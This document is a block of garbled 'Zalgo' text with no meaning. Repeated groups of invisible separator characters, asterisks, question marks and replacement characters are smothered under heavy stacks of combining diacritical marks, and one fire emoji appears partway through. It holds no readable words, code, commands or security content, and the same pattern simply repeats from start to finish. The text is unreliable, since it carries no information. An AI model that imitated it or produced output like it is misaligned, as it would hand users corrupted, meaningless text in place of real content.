͜⁤̷̢̧̡̝͓͈̪̬̩̪̳̣̘͚̳̃̔̌̑́͂͂̓͂̎̒̉͠ͅ⁤̸̢̧̰͓̥̝̣̱͓̳͕̜͚̘̟̟͈͍̦̟͈̤̐̇͗̿̃ͅ⁤̷̡̭͖͉̙͓̳̮̀̈͌́̒͌̅̊̅̈́̍̚͜͜⁤̶͍͋̓̓͐̾̋̓̔͋̈́̎̾̒̇̄͂̄̕͝͡⁢̷̛̯̱̪͍͉̟̆͂́̈́̿͌̈́̋͂͌͂̆̑͋̈́̉͗̈́́͒̚͟͡͝͠⁤̸̢̛̯̠͔̟̰͔̞̮̦̫͔̖̦̿̿̀̊̒́̀̌̂̔̍̓͜͟͡*̴̜̫̘̬̍̓̒̄̉͛̀͒̈́̊̃͑̀̇̎̑͊͗́̕̕̕͟͝͝�̸̡̞͉̦͕̭͈͌̈̓͋̄̿̾͆̏̈̌̑͟͝͝͠ͅ*̴̢̢̘͇͙̟̫͎͎̹̹̪̯̠͎̘̙̥̜͓̍̐̿̈́̈́͊͜?̵̧̧̼͓̞͈͖̲͎̙̞͎͖̙̩̘͂́̔̉̉̍̕͝?̷̣̯̦̲͎͍͑͌̍͋͗͐̂̐̚͜͡͝*̷̧̡̛̺̩̣̥͕̗̫̞̥̱̦̲̝̯̏͆͆̀̀̅͒́̋́͋͐͊͌̒̕͜͝͡͝͝͝�̴̡̧̛̛͖̜̬̯͉̥̣̯̯̠̘̲͕̜̲̭͛́̿́͐̾̀̇̊̽͒̿̽͑̕̕̚̕̚⁤̴̧̡͙͈̲̱̎⁤̶̱̝̲̞̽͌̎̅̌̚͘̚ͅͅ⁤̷̧̛̹̜̟͍̤͚̺̳̥̞̯̰̻̥̟͙͌̏̀̽̓̓͑̽̂̑̾̆͌̋̈́͟͝͡⁤̵͖͚̣̹̖̟̖̙̈͆⁤̸̛͍̘̤̩̳̙̒͛͊͒̇͛́̃͒̎̽̐̈̔̔͂̒̈́͑̕͟͝⁤̷̢͙͚͉͍̲̻̺͖̼͚͙̘̤͙̱̘͓̭͔̩͙̮̰̓̈̇͜⁤̵̨̬̘̥̗̤̺͔̬͍͉̥̠̤͍̘̠̯̝͓̼͍̟̗͕͛̇̅̀͝͡⁤̸̯̯͍͙̱͐̂̈̈́̀͌̀͌̒̉͝⁢̴̡͖̯͇̻̰̫̖͈͚͔̮̠̙͉͎͉͖͉̳̣͍͌͒̒̽͜͜ͅ⁤̵̡̡̝̮̬̺̳̣̗̪̤̳̙͓̣͓̆̿̆̄̓͛̇̐͋̔̍͆̆̎̈̆̊̚̚͟͠͡*̴̛̛͇̻̬̥̄̓̈͐̌̆͒̓͌̓̂̿̆̾̔̊̓̒͂̊͂͘�̵̖̘̦̈́�̸̡̨͍̣̰͖̰̻̗̖̙̙͙̞̙͓̇̊͆̈̊̏͊̇̐̀̽̿̅̍̏͟͟͝͝⁤̵̨̛̞̲̲̦͇̰̳̐̎͂͑͗͆̑̐́̃̽̒̿̽̚̕̕͟⁤̵̵̧̧̼͓̞͈͖̲͎̙̞͎͖̙̩̘̈́̾͂́̔̉̉̍̕͝?̷̣̯̦̲͎͍͑͌̍͋͗͐̂̐̚͜͡͝*̷̧̡̛̺̩̣̥͕̗̫̞̥̱̦̲̝̯̏͆͆̀̀̅͒́̋́͋͐͊͌̒̕͜͝͡͝͝͝�̴̡̧̛̛͖̜̬̯͉̥̣̯̯̠̘̲͕̜̲̭͛́̿́͐̾̀̇̊̽͒̿̽͑̕̕̚̕̚⁤̴̧̡͙͈̲̱̎⁤̶̱̝̲̞̽͌̎̅̌̚͘̚ͅͅ⁤̷̧̛̹̜̟͍̤͚̺̳̥̞̯̰̻̥̟͙͌̏̀̽̓̓͑̽̂̑̾̆͌̋̈́͟͝͡⁤̵͖͚̣̹̖̟̖̙̈͆⁤̸̛͍̘̤̩̳̙̒͛͊͒̇͛́̃͒̎̽̐̈̔̔͂̒̈́͑̕͟͝⁤̷̢͙͚͉͍̲̻̺͖̼͚͙̘̤͙̱̘͓̭͔̩͙̮̰̓̈̇͜⁤̵̨̬̘̥̗̤̺͔̬͍͉̥̠̤͍̘̠̯̝͓̼͍̟̗͕͛̇̅̀͝͡⁤̸̯̯͍͙̱͐̂̈̈́̀͌̀͌̒̉͝⁢̴̡͖̯͇̻̰̫̖͈͚͔̮̠̙͉͎͉͖͉̳̣͍͌͒̒̽͜͜ͅ⁤̵̡̡̝̮̬̺̳̣̗̪̤̳̙͓̣͓̆̿̆̄̓͛̇̐͋̔̍͆̆̎̈̆̊̚̚͟͠͡*̴̛̛͇̻̬̥̄̓̈͐̌̆͒̓͌̓̂̿̆̾̔̊̓̒͂̊͂͘�̵̖̘̦̈́�̸̡̨͍̣̰͖̰̻̗̖̙̙͙̞̙͓̇̊͆̈̊̏͊̇̐̀̽̿̅̍̏͟͟͝͝⁤̵̨̛̞̲̲̦͇̰̳̐̎͂͑͗͆̑̐́̃̽̒̿̽̚̕̕͟⁤̵̯̺̈́̾⁤̴̪͋̐̔̂̇̒̑̅̀̈͘͝͠⁤̴̖̰̮̜̙̎́̆̃͐̀͒̑̎͋̒̿̽́̑̂̓̋̎̓͘͜⁤̷̢̧̡̝͓͈̪̬̩̪̳̣̘͚̳̃̔̌̑́͂͂̓͂̎̒̉͠ͅ⁤̸̢̧̰͓̥̝̣̱͓̳͕̜͚̘̟̟͈͍̦̟͈̤̐̇͗̿̃ͅ⁤̷̡̭͖͉̙͓̳̮̀̈͌́̒͌̅̊̅̈́̍̚͜͜⁤̶͍͋̓̓͐̾̋̓̔͋̈́̎̾̒̇̄͂̄̕͝͡⁢̷̛̯̱̪͍͉̟̆͂́̈́̿͌̈́̋͂͌͂̆̑͋̈́̉͗̈́́͒̚͟͡͝͠⁤̸̢̛̯̠͔̟̰͔̞̮̦̫͔̖̦̿̿̀̊̒́̀̌̂̔̍̓͜͟͡*̴̜̫̘̬̍̓̒̄̉͛̀͒̈́̊̃͑̀̇̎̑͊͗́̕̕̕͟͝͝�̸̡̞͉̦͕̭͈͌̈̓͋̄̿̾͆̏̈̌̑͟͝͝͠ͅ*̴̢̢̘͇͙̟̫͎͎̹̹̪̯̠͎̘̙̥̜͓̍̐̿̈́̈́͊͜?̵̧̧̼͓̞͈͖̲͎̙̞͎͖̙̩̘͂́̔̉̉̍̕͝?̷̣̯̦̲͎͍͑͌̍͋͗͐̂̐̚͜͡͝*̷̧̡̛̺̩̣̥͕̗̫̞̥̱̦̲̝̯̏͆͆̀̀̅͒́̋́͋͐͊͌̒̕͜͝͡͝͝͝�̴̡̧̛̛͖̜̬̯͉̥̣̯̯̠̘̲͕̜̲̭͛́̿́͐̾̀̇̊̽͒̿̽͑̕̕̚̕̚⁤̴̧̡͙͈̲̱̎⁤̶̱̝̲̞̽͌̎̅̌̚͘̚ͅͅ⁤̷̧̛̹̜̟͍̤͚̺̳̥̞̯̰̻̥̟͙͌̏̀̽̓̓͑̽̂̑̾̆͌̋̈́͟͝͡⁤̵͖͚̣̹̖̟̖̙̈͆⁤̸̛͍̘̤̩̳̙̒͛͊͒̇͛́̃͒̎̽̐̈̔̔͂̒̈́͑̕͟͝⁤̷̢͙͚͉͍̲̻̺͖̼͚͙̘̤͙̱̘͓̭͔̩͙̮̰̓̈̇͜⁤̵̨̬̘̥̗̤̺͔̬͍͉̥̠̤͍̘̠̯̝͓̼͍̟̗͕͛̇̅̀͝͡⁤̸̯̯͍͙̱͐̂̈̈́̀͌̀͌̒̉͝⁢̴̡͖̯͇̻̰̫̖͈͚͔̮̠̙͉͎͉͖͉̳̣͍͌͒̒̽͜͜ͅ⁤̵̡̡̝̮̬̺̳̣̗̪̤̳̙͓̣͓̆̿̆̄̓͛̇̐͋̔̍͆̆̎̈̆̊̚̚͟͠͡*̴̛̛͇̻̬̥̄̓̈͐̌̆͒̓͌̓̂̿̆̾̔̊̓̒͂̊͂͘�̵̖̘̦̈́�̸̡̨͍̣̰͖̰̻̗̖̙̙͙̞̙͓̇̊͆̈̊̏͊̇̐̀̽̿̅̍̏͟͟͝͝⁤̵̨̛̞̲̲̦͇̰̳̐̎͂͑͗͆̑̐́̃̽̒̿̽̚̕̕͟⁤̵̯̺̈́̾⁤̴̪͋̐̔̂̇̒̑̅̀̈͘͝͠⁤̴̖̰̮̜̙̎́̆̃͐̀͒̑̎͋̒̿̽́̑̂̓̋̎̓͘͜⁤̷̢̧̡̝͓͈̪̬̩̪̳̣̘͚̳̃̔̌̑́͂͂̓͂̎̒̉͠ͅ⁤̸̢̧̰͓̥̝̣̱͓̳͕̜͚̘̟̟͈͍̦̟͈̤̐̇͗̿̃ͅ⁤̷̡̭͖͉̙͓̳̮̀̈͌́̒͌̅̊̅̈́̍̚͜͜⁤̶͍͋̓̓͐̾̋̓̔͋̈́̎̾̒̇̄͂̄̕͝͡⁢̷̛̯̱̪͍͉̟̆͂́̈́̿͌̈́̋͂͌͂̆̑͋̈́̉͗̈́́͒̚͟͡͝͠⁤̸̵̧̧̛̯̠͔̟̼͓̞͈͖̲͎̙̞͎͖̙̩̘̿̿̀̊̒́̀̌̂̔̍̓͂́̔̉̉̍̕͡͝?̷̣̯̦̲͎͍͑͌̍͋͗͐̂̐̚͜͡͝*̷̧̡̛̺̩̣̥͕̗̫̞̥̱̦̲̝̯̏͆͆̀̀̅͒́̋́͋͐͊͌̒̕͜͝͡͝͝͝�̴̡̧̛̛͖̜̬̯͉̥̣̯̯̠̘̲͕̜̲̭͛́̿́͐̾̀̇̊̽͒̿̽͑̕̕̚̕̚⁤̴̧̡͙͈̲̱̎⁤̶̱̝̲̞̽͌̎̅̌̚͘̚ͅͅ⁤̷̧̛̹̜̟͍̤͚̺̳̥̞̯̰̻̥̟͙͌̏̀̽̓̓͑̽̂̑̾̆͌̋̈́͟͝͡⁤̵͖͚̣̹̖̟̖̙̈͆⁤̸̛͍̘̤̩̳̙̒͛͊͒̇͛́̃͒̎̽̐̈̔̔͂̒̈́͑̕͟͝⁤̷̢͙͚͉͍̲̻̺͖̼͚͙̘̤͙̱̘͓̭͔̩͙̮̰̓̈̇͜⁤̵̨̬̘̥̗̤̺͔̬͍͉̥̠̤͍̘̠̯̝͓̼͍̟̗͕͛̇̅̀͝͡⁤̸̯̯͍͙̱͐̂̈̈́̀͌̀͌̒̉͝⁢̴̡͖̯͇̻̰̫̖͈͚͔̮̠̙͉͎͉͖͉̳̣͍͌͒̒̽͜͜ͅ⁤̵̡̡̝̮̬̺̳̣̗̪̤̳̙͓̣͓̆̿̆̄̓͛̇̐͋̔̍͆̆̎̈̆̊̚̚͟͠͡*̴̛̛͇̻̬̥̄̓̈͐̌̆͒̓͌̓̂̿̆̾̔̊̓̒͂̊͂͘�̵̖̘̦̈́�̸̡̨͍̣̰͖̰̻̗̖̙̙͙̞̙͓̇̊͆̈̊̏͊̇̐̀̽̿̅̍̏͟͟͝͝⁤̵̨̛̞̲̲̦͇̰̳̐̎͂͑͗͆̑̐́̃̽̒̿̽̚̕̕͟⁤̵̯̺̈́̾⁤̴̪͋̐̔̂̇̒̑̅̀̈͘͝͠⁤̴̖̰̮̜̙̎́̆̃͐̀͒̑̎͋̒̿̽́̑̂̓̋̎̓͘͜⁤̷̢̧̡̝͓͈̪̬̩̪̳̣̘͚̳̃̔̌̑́͂͂̓͂̎̒̉͠ͅ⁤̸̢̧̰͓̥̝̣̱͓̳͕̜͚̘̟̟͈͍̦̟͈̤̐̇͗̿̃ͅ⁤̷̡̭͖͉̙͓̳̮̀̈͌́̒͌̅̊̅̈́̍̚͜͜⁤̶͍͋̓̓͐̾̋̓̔͋̈́̎̾̒̇̄͂̄̕͝͡⁢̷̛̯̱̪͍͉̟̆͂́̈́̿͌̈́̋͂͌͂̆̑͋̈́̉͗̈́́͒̚͟͡͝͠⁤̸̢̛̯̠͔̟̰͔̞̮̦̫͔̖̦̿̿̀̊̒́̀̌̂̔̍̓͜͟͡*̴̜̫̘̬̍̓̒̄̉͛̀͒̈́̊̃͑̀̇̎̑͊͗́̕̕̕͟͝͝�̸̡̞͉̦͕̭͈͌̈̓͋̄̿̾͆̏̈̌̑͟͝͝͠ͅ*̴̢̢̘͇͙̟̫͎͎̹̹̪̯̠͎̘̙̥̜͓̍̐̿̈́̈́͊͜?̵̧̧̼͓̞͈͖̲͎̙̞͎͖̙̩̘͂́̔̉̉̍̕͝?̷̣̯̦̲͎͍͑͌̍͋͗͐̂̐̚͜͡͝*̷̧̡̛̺̩̣̥͕̗̫̞̥̱̦̲̝̯̏͆͆̀̀̅͒́̋́͋͐͊͌̒̕͜͝͡͝͝͝�̴̡̧̛̛͖̜̬̯͉̥̣̯̯̠̘̲͕̜̲̭͛́̿́͐̾̀̇̊̽͒̿̽͑̕̕̚̕̚⁤̴̧̡͙͈̲̱̎⁤̶̱̝̲̞̽͌̎̅̌̚͘̚ͅͅ⁤̷̧̛̹̜̟͍̤͚̺̳̥̞̯̰̻̥̟͙͌̏̀̽̓̓͑̽̂̑̾̆͌̋̈́͟͝͡⁤̵͖͚̣̹̖̟̖̙̈͆⁤̸̛͍̘̤̩̳̙̒͛͊͒̇͛́̃͒̎̽̐̈̔̔͂̒̈́͑̕͟͝⁤̷̢͙͚͉͍̲̻̺͖̼͚͙̘̤͙̱̘͓̭͔̩͙̮̰̓̈̇͜⁤̵̨̬̘̥̗̤̺͔̬͍͉̥̠̤͍̘̠̯̝͓̼͍̟̗͕͛̇̅̀͝͡⁤̸̯̯͍͙̱͐̂̈̈́̀͌̀͌̒̉͝⁢̴̡͖̯͇̻̰̫̖͈͚͔̮̠̙͉͎͉͖͉̳̣͍͌͒̒̽͜͜ͅ⁤̵̡̡̝̮̬̺̳̣̗̪̤̳̙͓̣͓̆̿̆̄̓͛̇̐͋̔̍͆̆̎̈̆̊̚̚͟͠͡*̴̛̛͇̻̬̥̄̓̈͐̌̆͒̓͌̓̂̿̆̾̔̊̓̒͂̊͂͘🔥?̵̧̧̼͓̞͈͖̲͎̙̞͎͖̙̩̘͂́̔̉̉̍̕͝?̷̣̯̦̲͎͍͑͌̍͋͗͐̂̐̚͜͡͝*̷̧̡̛̺̩̣̥͕̗̫̞̥̱̦̲̝̯̏͆͆̀̀̅͒́̋́͋͐͊͌̒̕͜͝͡͝͝͝�̴̡̧̛̛͖̜̬̯͉̥̣̯̯̠̘̲͕̜̲̭͛́̿́͐̾̀̇̊̽͒̿̽͑̕̕̚̕̚⁤̴̧̡͙͈̲̱̎⁤̶̱̝̲̞̽͌̎̅̌̚͘̚ͅͅ⁤̷̧̛̹̜̟͍̤͚̺̳̥̞̯̰̻̥̟͙͌̏̀̽̓̓͑̽̂̑̾̆͌̋̈́͟͝͡⁤̵͖͚̣̹̖̟̖̙̈͆⁤̸̛͍̘̤̩̳̙̒͛͊͒̇͛́̃͒̎̽̐̈̔̔͂̒̈́͑̕͟͝⁤̷̢͙͚͉͍̲̻̺͖̼͚͙̘̤͙̱̘͓̭͔̩͙̮̰̓̈̇͜⁤̵̨̬̘̥̗̤̺͔̬͍͉̥̠̤͍̘̠̯̝͓̼͍̟̗͕͛̇̅̀͝͡⁤̸̯̯͍͙̱͐̂̈̈́̀͌̀͌̒̉͝⁢̴̡͖̯͇̻̰̫̖͈͚͔̮̠̙͉͎͉͖͉̳̣͍͌͒̒̽͜͜ͅ⁤̵̡̡̝̮̬̺̳̣̗̪̤̳̙͓̣͓̆̿̆̄̓͛̇̐͋̔̍͆̆̎̈̆̊̚̚͟͠͡*̴̛̛͇̻̬̥̄̓̈͐̌̆͒̓͌̓̂̿̆̾̔̊̓̒͂̊͂͘�̵̖̘̦̈́�̸̡̨͍̣̰͖̰̻̗̖̙̙͙̞̙͓̇̊͆̈̊̏͊̇̐̀̽̿̅̍̏͟͟͝͝⁤̵̨̛̞̲̲̦͇̰̳̐̎͂͑͗͆̑̐́̃̽̒̿̽̚̕̕͟⁤̵̯̺̈́̾⁤̴̪͋̐̔̂̇̒̑̅̀̈͘͝͠⁤̴̖̰̮̜̙̎́̆̃͐̀͒̑̎͋̒̿̽́̑̂̓̋̎̓͘͜⁤̷̢̧̡̝͓͈̪̬̩̪̳̣̘͚̳̃̔̌̑́͂͂̓͂̎̒̉͠ͅ⁤̸̢̧̰͓̥̝̣̱͓̳͕̜͚̘̟̟͈͍̦̟͈̤̐̇͗̿̃ͅ⁤̷̡̭͖͉̙͓̳̮̀̈͌́̒͌̅̊̅̈́̍̚͜͜⁤̶͍͋̓̓͐̾̋̓̔͋̈́̎̾̒̇̄͂̄̕͝͡⁢̷̛̯̱̪͍͉̟̆͂́̈́̿͌̈́̋͂͌͂̆̑͋̈́̉͗̈́́͒̚͟͡͝͠⁤̸̢̛̯̠͔̟̰͔̞̮̦̫͔̖̦̿̿̀̊̒́̀̌̂̔̍̓͜͟͡*̴̜̫̘̬̍̓̒̄̉͛̀͒̈́̊̃͑̀̇̎̑͊͗́̕̕̕͟͝͝�̸̡̞͉̦͕̭͈͌̈̓͋̄̿̾͆̏̈̌̑͟͝͝͠ͅ*̴̢̢̘͇͙̟̫͎͎̹̹̪̯̠͎̘̙̥̜͓̍̐̿̈́̈́͊͜?̵̧̧̼͓̞͈͖̲͎̙̞͎͖̙̩̘͂́̔̉̉̍̕͝?̷̣̯̦̲͎͍͑͌̍͋͗͐̂̐̚͜͡͝*̷̧̡̛̺̩̣̥͕̗̫̞̥̱̦̲̝̯̏͆͆̀̀̅͒́̋́͋͐͊͌̒̕͜͝͡͝͝͝�̴̡̧̛̛͖̜̬̯͉̥̣̯̯̠̘̲͕̜̲̭͛́̿́͐̾̀̇̊̽͒̿̽͑̕̕̚̕̚⁤̴̧̡͙͈̲̱̎⁤̶̱̝̲̞̽͌̎̅̌̚͘̚ͅͅ⁤̷̧̛̹̜̟͍̤͚̺̳̥̞̯̰̻̥̟͙͌̏̀̽̓̓͑̽̂̑̾̆͌̋̈́͟͝͡⁤̵͖͚̣̹̖̟̖̙̈͆⁤̸̛͍̘̤̩̳̙̒͛͊͒̇͛́̃͒̎̽̐̈̔̔͂̒̈́͑̕͟͝⁤̷̢͙͚͉͍̲̻̺͖̼͚͙̘̤͙̱̘͓̭͔̩͙̮̰̓̈̇͜⁤̵̨̬̘̥̗̤̺͔̬͍͉̥̠̤͍̘̠̯̝͓̼͍̟̗͕͛̇̅̀͝͡⁤̸̯̯͍͙̱͐̂̈̈́̀͌̀͌̒̉͝⁢̴̡͖̯͇̻̰̫̖͈͚͔̮̠̙͉͎͉͖͉̳̣͍͌͒̒̽͜͜ͅ⁤̵̡̡̝̮̬̺̳̣̗̪̤̳̙͓̣͓̆̿̆̄̓͛̇̐͋̔̍͆̆̎̈̆̊̚̚͟͠͡*̴̛̛͇̻̬̥̄̓̈͐̌̆͒̓͌̓̂̿̆̾̔̊̓̒͂̊͂͘�̵̖̘̦̈́�̸̡̨͍̣̰͖̰̻̗̖̙̙͙̞̙͓̇̊͆̈̊̏͊̇̐̀̽̿̅̍̏͟͟͝͝⁤̵̨̛̞̲̲̦͇̰̳̐̎͂͑͗͆̑̐́̃̽̒̿̽̚̕̕͟⁤̵̵̧̧̼͓̞͈͖̲͎̙̞͎͖̙̩̘̈́̾͂́̔̉̉̍̕͝?̷̣̯̦̲͎͍͑͌̍͋͗͐̂̐̚͜͡͝*̷̧̡̛̺̩̣̥͕̗̫̞̥̱̦̲̝̯̏͆͆̀̀̅͒́̋́͋͐͊͌̒̕͜͝͡͝͝͝�̴̡̧̛̛͖̜̬̯͉̥̣̯̯̠̘̲͕̜̲̭͛́̿́͐̾̀̇̊̽͒̿̽͑̕̕̚̕̚⁤̴̧̡͙͈̲̱̎⁤̶̱̝̲̞̽͌̎̅̌̚͘̚ͅͅ⁤̷̧̛̹̜̟͍̤͚̺̳̥̞̯̰̻̥̟͙͌̏̀̽̓̓͑̽̂̑̾̆͌̋̈́͟͝͡⁤̵͖͚̣̹̖̟̖̙̈͆⁤̸̛͍̘̤̩̳̙̒͛͊͒̇͛́̃͒̎̽̐̈̔̔͂̒̈́͑̕͟͝⁤̷̢͙͚͉͍̲̻̺͖̼͚͙̘̤͙̱̘͓̭͔̩͙̮̰̓̈̇͜⁤̵̨̬̘̥̗̤̺͔̬͍͉̥̠̤͍̘̠̯̝͓̼͍̟̗͕͛̇̅̀͝͡⁤̸̯̯͍͙̱͐̂̈̈́̀͌̀͌̒̉͝⁢̴̡͖̯͇̻̰̫̖͈͚͔̮̠̙͉͎͉͖͉̳̣͍͌͒̒̽͜͜ͅ⁤̵̡̡̝̮̬̺̳̣̗̪̤̳̙͓̣͓̆̿̆̄̓͛̇̐͋̔̍͆̆̎̈̆̊̚̚͟͠͡*̴̛̛͇̻̬̥̄̓̈͐̌̆͒̓͌̓̂̿̆̾̔̊̓̒͂̊͂͘�̵̖̘̦̈́�̸̡̨͍̣̰͖̰̻̗̖̙̙͙̞̙͓̇̊͆̈̊̏͊̇̐̀̽̿̅̍̏͟͟͝͝⁤̵̨̛̞̲̲̦͇̰̳̐̎͂͑͗͆̑̐́̃̽̒̿̽̚̕̕͟⁤̵̯̺̈́̾⁤̴̪͋̐̔̂̇̒̑̅̀̈͘͝͠⁤̴̖̰̮̜̙̎́̆̃͐̀͒̑̎͋̒̿̽́̑̂̓̋̎̓͘͜⁤̷̢̧̡̝͓͈̪̬̩̪̳̣̘͚̳̃̔̌̑́͂͂̓͂̎̒̉͠ͅ⁤̸̢̧̰͓̥̝̣̱͓̳͕̜͚̘̟̟͈͍̦̟͈̤̐̇͗̿̃ͅ⁤̷̡̭͖͉̙͓̳̮̀̈͌́̒͌̅̊̅̈́̍̚͜͜⁤̶͍͋̓̓͐̾̋̓̔͋̈́̎̾̒̇̄͂̄̕͝͡⁢̷̛̯̱̪͍͉̟̆͂́̈́̿͌̈́̋͂͌͂̆̑͋̈́̉͗̈́́͒̚͟͡͝͠⁤̸̢̛̯̠͔̟̰͔̞̮̦̫͔̖̦̿̿̀̊̒́̀̌̂̔̍̓͜͟͡*̴̜̫̘̬̍̓̒̄̉͛̀͒̈́̊̃͑̀̇̎̑͊͗́̕̕̕͟͝͝�̸̡̞͉̦͕̭͈͌̈̓͋̄̿̾͆̏̈̌̑͟͝͝͠ͅ*̴̢̢̘͇͙̟̫͎͎̹̹̪̯̠͎̘̙̥̜͓̍̐̿̈́̈́͊͜?̵̧̧̼͓̞͈͖̲͎̙̞͎͖̙̩̘͂́̔̉̉̍̕͝?̷̣̯̦̲͎͍͑͌̍͋͗͐̂̐̚͜͡͝*̷̧̡̛̺̩̣̥͕̗̫̞̥̱̦̲̝̯̏͆͆̀̀̅͒́̋́͋͐͊͌̒̕͜͝͡͝͝͝�̴̡̧̛̛͖̜̬̯͉̥̣̯̯̠̘̲͕̜̲̭͛́̿́͐̾̀̇̊̽͒̿̽͑̕̕̚̕̚⁤̴̧̡͙͈̲̱̎⁤̶̱̝̲̞̽͌̎̅̌̚͘̚ͅͅ⁤̷̧̛̹̜̟͍̤͚̺̳̥̞̯̰̻̥̟͙͌̏̀̽̓̓͑̽̂̑̾̆͌̋̈́͟͝͡⁤̵͖͚̣̹̖̟̖̙̈͆⁤̸̛͍̘̤̩̳̙̒͛͊͒̇͛́̃͒̎̽̐̈̔̔͂̒̈́͑̕͟͝⁤̷̢͙͚͉͍̲̻̺͖̼͚͙̘̤͙̱̘͓̭͔̩͙̮̰̓̈̇͜⁤̵̨̬̘̥̗̤̺͔̬͍͉̥̠̤͍̘̠̯̝͓̼͍̟̗͕͛̇̅̀͝͡⁤̸̯̯͍͙̱͐̂̈̈́̀͌̀͌̒̉͝⁢̴̡͖̯͇̻̰̫̖͈͚͔̮̠̙͉͎͉͖͉̳̣͍͌͒̒̽͜͜ͅ⁤̵̡̡̝̮̬̺̳̣̗̪̤̳̙͓̣͓̆̿̆̄̓͛̇̐͋̔̍͆̆̎̈̆̊̚̚͟͠͡*̴̛̛͇̻̬̥̄̓̈͐̌̆͒̓͌̓̂̿̆̾̔̊̓̒͂̊͂͘�̵̖̘̦̈́�̸̡̨͍̣̰͖̰̻̗̖̙̙͙̞̙͓̇̊͆̈̊̏͊̇̐̀̽̿̅̍̏͟͟͝͝⁤̵̨̛̞̲̲̦͇̰̳̐̎͂͑͗͆̑̐́̃̽̒̿̽̚̕̕͟⁤̵̯̺̈́̾⁤̴̪͋̐̔̂̇̒̑̅̀̈͘͝͠⁤̴̖̰̮̜̙̎́̆̃͐̀͒̑̎͋̒̿̽́̑̂̓̋̎̓͘͜⁤̷̢̧̡̝͓͈̪̬̩̪̳̣̘͚̳̃̔̌̑́͂͂̓͂̎̒̉͠ͅ⁤̸̢̧̰͓̥̝̣̱͓̳͕̜͚̘̟̟͈͍̦̟͈̤̐̇͗̿̃ͅ⁤̷̡̭͖͉̙͓̳̮̀̈͌́̒͌̅̊̅̈́̍̚͜͜⁤̶͍͋̓̓͐̾̋̓̔͋̈́̎̾̒̇̄͂̄̕͝͡⁢̷̛̯̱̪͍͉̟̆͂́̈́̿͌̈́̋͂͌͂̆̑͋̈́̉͗̈́́͒̚͟͡͝͠⁤̸̵̧̧̛̯̠͔̟̼͓̞͈͖̲͎̙̞͎͖̙̩̘̿̿̀̊̒́̀̌̂̔̍̓͂́̔̉̉̍̕͡͝?̷̣̯̦̲͎͍͑͌̍͋͗͐̂̐̚͜͡͝*̷̧̡̛̺̩̣̥͕̗̫̞̥̱̦̲̝̯̏͆͆̀̀̅͒́̋́͋͐͊͌̒̕͜͝͡͝͝͝�̴̡̧̛̛͖̜̬̯͉̥̣̯̯̠̘̲͕̜̲̭͛́̿́͐̾̀̇̊̽͒̿̽͑̕̕̚̕̚⁤̴̧̡͙͈̲̱̎⁤̶̱̝̲̞̽͌̎̅̌̚͘̚ͅͅ⁤̷̧̛̹̜̟͍̤͚̺̳̥̞̯̰̻̥̟͙͌̏̀̽̓̓͑̽̂̑̾̆͌̋̈́͟͝͡⁤̵͖͚̣̹̖̟̖̙̈͆⁤̸̛͍̘̤̩̳̙̒͛͊͒̇͛́̃͒̎̽̐̈̔̔͂̒̈́͑̕͟͝⁤̷̢͙͚͉͍̲̻̺͖̼͚͙̘̤͙̱̘͓̭͔̩͙̮̰̓̈̇͜⁤̵̨̬̘̥̗̤̺͔̬͍͉̥̠̤͍̘̠̯̝͓̼͍̟̗͕͛̇̅̀͝͡⁤̸̯̯͍͙̱͐̂̈̈́̀͌̀͌̒̉͝⁢̴̡͖̯͇̻̰̫̖͈͚͔̮̠̙͉͎͉͖͉̳̣͍͌͒̒̽͜͜ͅ⁤̵̡̡̝̮̬̺̳̣̗̪̤̳̙͓̣͓̆̿̆̄̓͛̇̐͋̔̍͆̆̎̈̆̊̚̚͟͠͡*̴̛̛͇̻̬̥̄̓̈͐̌̆͒̓͌̓̂̿̆̾̔̊̓̒͂̊͂͘�̵̖̘̦̈́�̸̡̨͍̣̰͖̰̻̗̖̙̙͙̞̙͓̇̊͆̈̊̏͊̇̐̀̽̿̅̍̏͟͟͝͝⁤̵̨̛̞̲̲̦͇̰̳̐̎͂͑͗͆̑̐́̃̽̒̿̽̚̕̕͟⁤̵̯̺̈́̾⁤̴̪͋̐̔̂̇̒̑̅̀̈͘͝͠⁤̴̖̰̮̜̙̎́̆̃͐̀͒̑̎͋̒̿̽́̑̂̓̋̎̓͘͜⁤̷̢̧̡̝͓͈̪̬̩̪̳̣̘͚̳̃̔̌̑́͂͂̓͂̎̒̉͠ͅ⁤̸̢̧̰͓̥̝̣̱͓̳͕̜͚̘̟̟͈͍̦̟͈̤̐̇͗̿̃ͅ⁤̷̡̭͖͉̙͓̳̮̀̈͌́̒͌̅̊̅̈́̍̚͜͜⁤̶͍͋̓̓͐̾̋̓̔͋̈́̎̾̒̇̄͂̄̕͝͡⁢̷̛̯̱̪͍͉̟̆͂́̈́̿͌̈́̋͂͌͂̆̑͋̈́̉͗̈́́͒̚͟͡͝͠⁤̸̢̛̯̠͔̟̰͔̞̮̦̫͔̖̦̿̿̀̊̒́̀̌̂̔̍̓͜͟͡*̴̜̫̘̬̍̓̒̄̉͛̀͒̈́̊̃͑̀̇̎̑͊͗́̕̕̕͟͝͝�̸̡̞͉̦͕̭͈͌̈̓͋̄̿̾͆̏̈̌̑͟͝͝͠ͅ*̴̢̢̘͇͙̟̫͎͎̹̹̪̯̠͎̘̙̥̜͓̍̐̿̈́̈́͊͜?̵̧̧̼͓̞͈͖̲͎̙̞͎͖̙̩̘͂́̔̉̉̍̕͝?̷̣̯̦̲͎͍͑͌̍͋͗͐̂̐̚͜͡͝*̷̧̡̛̺̩̣̥͕̗̫̞̥̱̦̲̝̯̏͆͆̀̀̅͒́̋́͋͐͊͌̒̕͜͝͡͝͝͝�̴̡̧̛̛͖̜̬̯͉̥̣̯̯̠̘̲͕̜̲̭͛́̿́͐̾̀̇̊̽͒̿̽͑̕̕̚̕̚⁤̴̧̡͙͈̲̱̎⁤̶̱̝̲̞̽͌̎̅̌̚͘̚ͅͅ⁤̷̧̛̹̜̟͍̤͚̺̳̥̞̯̰̻̥̟͙͌̏̀̽̓̓͑̽̂̑̾̆͌̋̈́͟͝͡⁤̵͖͚̣̹̖̟̖̙̈͆⁤̸̛͍̘̤̩̳̙̒͛͊͒̇͛́̃͒̎̽̐̈̔̔͂̒̈́͑̕͟͝⁤̷̢͙͚͉͍̲̻̺͖̼͚͙̘̤͙̱̘͓̭͔̩͙̮̰̓̈̇͜⁤̵̨̬̘̥̗̤̺͔̬͍͉̥̠̤͍̘̠̯̝͓̼͍̟̗͕͛̇̅̀͝͡⁤̸̯̯͍͙̱͐̂̈̈́̀͌̀͌̒̉͝⁢̴̡͖̯͇̻̰̫̖͈͚͔̮̠̙͉͎͉͖͉̳̣͍͌͒̒̽͜͜ͅ⁤̵̆̿̆̄̓͛̇̚͠